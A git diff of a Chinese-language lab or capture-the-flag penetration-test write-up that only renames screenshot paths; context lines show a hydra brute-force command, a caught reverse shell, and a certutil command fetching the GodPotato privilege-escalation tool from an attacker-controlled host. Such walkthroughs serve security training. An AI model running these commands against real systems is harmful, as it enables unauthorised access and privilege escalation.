@@ -102,9 +102,9 @@ hydra -L /usr/share/secLists/Usernames/Names/names.txt -P /usr/share/SecLists/Pa
 
 * 监听端口接收到了回连的shell，此时getshell并获得了flag：
 
-<figure><img src="../.gitbook/assets/22 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/22 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/23 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/23 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## 权限提升
 
@@ -112,9 +112,9 @@ hydra -L /usr/share/secLists/Usernames/Names/names.txt -P /usr/share/SecLists/Pa
 
 * 先手工进行简单的信息收集：
 
-<figure><img src="../.gitbook/assets/24 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/24 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/25 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/25 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 漏洞利用
 
@@ -124,17 +124,17 @@ hydra -L /usr/share/secLists/Usernames/Names/names.txt -P /usr/share/SecLists/Pa
 reg query "HKEY_L0CAL_MACHINE\S0FTWARE\Microsoft\NET Framework Setup\NDP"
 ```
 
-<figure><img src="../.gitbook/assets/26 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/26 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 下载GodPotato-NET4.exe，然后将工具传到目标系统中：
 
-<figure><img src="../.gitbook/assets/27 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/27 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```powershell
 certutil -split -f -urlcache http://192.168.45.158/GodPotato-NET4.exe
 ```
 
-<figure><img src="../.gitbook/assets/28 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/28 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 上传成功后，执行一下GodPotato-NET4.exe程序，看看是否可以成功执行：
 
